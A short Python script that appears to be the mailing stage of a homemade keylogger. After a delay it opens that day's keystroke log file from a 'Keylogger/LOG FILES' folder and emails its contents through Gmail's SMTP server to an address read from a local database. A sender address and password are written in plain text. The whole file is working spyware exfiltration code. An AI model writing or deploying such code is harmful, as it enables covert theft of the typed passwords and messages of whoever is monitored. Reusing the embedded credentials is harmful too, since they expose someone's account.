import schedule
import time

def job():
    import sqlite3
    con2=sqlite3.Connection('Email')
    cur2=con2.cursor()
    cur2.execute('select * from email')
    recipient_email=cur2.fetchall()
    sender_email='divyanshsengarjuet@gmail.com'
    password='26060000'
    import smtplib
    date=time.localtime().tm_mday,time.localtime().tm_mon,time.localtime().tm_year

    today=str(date[0])+'-'+str(date[1])+'-'+str(date[2])
    f=open('C:/Users/divyansh/Desktop/Keylogger/LOG FILES/'+today+'.txt','r')
    text='Keylog file\n'+f.read()
    server=smtplib.SMTP_SSL('smtp.gmail.com',465)
    server.login(sender_email,password)
    server.sendmail(sender_email,
                    recipient_email[0][0],
                    text)
    server.quit()
time.sleep(300)
job()
##try:
##    job()
##except FileNotFoundError:
##    schedule.every().day.at('00:00:10').do(job)
##while 1:
##    schedule.run_pending()
##    time.sleep(1)



